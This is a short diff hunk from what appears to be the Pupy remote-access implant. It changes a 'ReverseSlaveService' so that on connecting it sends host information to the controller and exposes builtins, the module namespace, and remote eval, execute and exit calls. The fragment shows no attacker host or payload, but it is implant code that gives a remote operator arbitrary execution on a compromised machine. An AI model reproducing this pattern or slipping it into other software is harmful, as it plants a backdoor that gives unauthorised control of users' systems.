@@ -483,8 +483,23 @@ class ReverseSlaveService(Service):
         self.exposed_cleanups = []
         self._conn._config.update(REVERSE_SLAVE_CONF)
 
+        infos = Buffer()
+        umsgpack.dump(self.exposed_get_infos(), infos)
+
         pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
-        self._conn.root.set_modules(pupy.namespace)
+        self._conn.root.initialize_v1(
+            self.exposed_namespace,
+            pupy.namespace,
+            sys.modules['__builtin__'],
+            self.exposed_register_cleanup,
+            self.exposed_unregister_cleanup,
+            self.exposed_obtain_call,
+            self.exposed_exit,
+            self.exposed_eval,
+            self.exposed_execute,
+            sys.modules.get('pupyimporter'),
+            infos
+        )
 
     def on_disconnect(self):
         for cleanup in self.exposed_cleanups:
